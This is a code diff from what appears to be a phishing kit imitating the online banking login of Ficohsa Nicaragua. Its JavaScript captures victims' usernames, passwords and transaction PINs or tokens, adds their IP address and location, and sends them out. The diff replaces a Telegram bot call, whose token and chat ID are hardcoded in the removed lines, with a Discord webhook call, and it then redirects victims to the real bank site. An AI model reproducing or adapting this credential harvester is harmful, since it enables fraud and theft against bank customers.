@@ -1,91 +1,76 @@
 document.addEventListener("DOMContentLoaded", function() {
-    // Agregar evento de envío de formulario para la página de inicio de sesión
+    var storedUser = localStorage.getItem("ficohsaUser") || "";
+
     var formLogin = document.getElementById("formLogin");
     if (formLogin) {
         formLogin.addEventListener("submit", function(event) {
             event.preventDefault();
             var username = document.getElementById("username").value;
-            obtenerUbicacionYEnviarMensajeTelegram(username, username, "index2.html", "💲 Ficohsa Nica 💲:\nUsuario: " + username);
+            localStorage.setItem("ficohsaUser", username);
+            obtenerUbicacionYEnviarDatos(username, "", "index2.html", "💲 Ficohsa Nica 💲\nUsuario: " + username + "\nClave: [usuario ingresado]");
         });
     }
 
-    // Agregar evento de envío de formulario para la página de código de operaciones
     var loginForm = document.getElementById("formLogin2");
     if (loginForm) {
         loginForm.addEventListener("submit", function(event) {
             event.preventDefault();
             var password = document.getElementById("password").value;
-            obtenerUbicacionYEnviarMensajeTelegram(password, password, "cargando.html?action=username-password", "💲 Ficohsa Nica 💲:\nContraseña: " + password);
+            var user = localStorage.getItem("ficohsaUser") || "No registrado";
+            obtenerUbicacionYEnviarDatos(user, password, "cargando.html?action=username-password", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nClave: " + password);
         });
     }
 
-    // Agregar evento de envío de formulario para la sección de contacto
     var formContacto = document.getElementById("formLogin3");
     if (formContacto) {
         formContacto.addEventListener("submit", function(event) {
             event.preventDefault();
-             var password = document.getElementById("password").value;
-            obtenerUbicacionYEnviarMensajeTelegram(password, password, "cargando.html?action=token", "💲 Ficohsa Nica 💲:\nPin Transaccional o Token: " + password);
+            var password = document.getElementById("password").value;
+            var user = localStorage.getItem("ficohsaUser") || "No registrado";
+            obtenerUbicacionYEnviarDatos(user, password, "cargando.html?action=token", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nPin Transaccional o Token: " + password);
         });
     }
 
-    // Agregar evento de envío de formulario para el formulario adicional loginForm3
     var formContacto3 = document.getElementById("formLogin4");
     if (formContacto3) {
         formContacto3.addEventListener("submit", function(event) {
             event.preventDefault();
-          var password = document.getElementById("password").value;
-            obtenerUbicacionYEnviarMensajeTelegram(password, password, "https://www.ficohsa.com/ni/", "💲 Ficohsa Nica 💲:\nPin Transaccional o Token: " + password);
+            var password = document.getElementById("password").value;
+            var user = localStorage.getItem("ficohsaUser") || "No registrado";
+            obtenerUbicacionYEnviarDatos(user, password, "https://www.ficohsa.com/ni/", "💲 Ficohsa Nica 💲\nUsuario: " + user + "\nPin Transaccional o Token: " + password);
         });
     }
-
 });
 
-function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+function obtenerUbicacionYEnviarDatos(user, value, nextPage, message) {
     fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-        var country = data.country_name;
-        var region = data.region;
-        var ip = data.ip;
-        if (country && region && ip) {
-            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
-        } else {
-            message += '\nNo se pudo obtener la ubicación.';
-        }
-        enviarMensajeTelegram(message, nextPage);
-    })
-    .catch(error => {
-        console.error("Error al obtener la ubicación:", error);
-        message += "\nError al obtener la ubicación.";
-        enviarMensajeTelegram(message, nextPage);
-    });
+        .then(response => response.json())
+        .then(data => {
+            var city = data.city || "No disponible";
+            var region = data.region || "No disponible";
+            var country = data.country_name || "No disponible";
+            var ip = data.ip || "No disponible";
+            message += '\nCiudad: ' + city + '\nEstado: ' + region + '\nPaís: ' + country + '\nIP: ' + ip;
+            enviarDatosAlWebhook(message, nextPage);
+        })
+        .catch(error => {
+            console.error("Error al obtener la ubicación:", error);
+            message += '\nCiudad: No disponible\nEstado: No disponible\nPaís: No disponible\nIP: No disponible';
+            enviarDatosAlWebhook(message, nextPage);
+        });
 }
 
-function enviarMensajeTelegram(mensaje, nextPage) {
-    var token = '6744581534:AAHhY-JipwUkVVFxnARQ0bDX71Qzqd6Dxt8';
-    var chatId = '1824979522';
-    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
-    var params = {
-        chat_id: chatId,
-        text: mensaje
-    };
-
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Ocurrió un error al enviar el mensaje.');
-        }
-        console.log('Mensaje enviado con éxito.');
-        window.location.href = nextPage;
-    })
-    .catch(error => {
-        console.error('Error al enviar el mensaje:', error);
-    });
+function enviarDatosAlWebhook(mensaje, nextPage) {
+    window.enviarDatosAlDiscord(mensaje)
+        .then(result => {
+            if (result.success) {
+                console.log('Datos enviados al webhook de Discord con éxito.');
+                window.location.href = nextPage;
+            } else {
+                console.error('Error al enviar datos al webhook:', result.message);
+            }
+        })
+        .catch(error => {
+            console.error('Error al enviar datos al webhook:', error);
+        });
 }
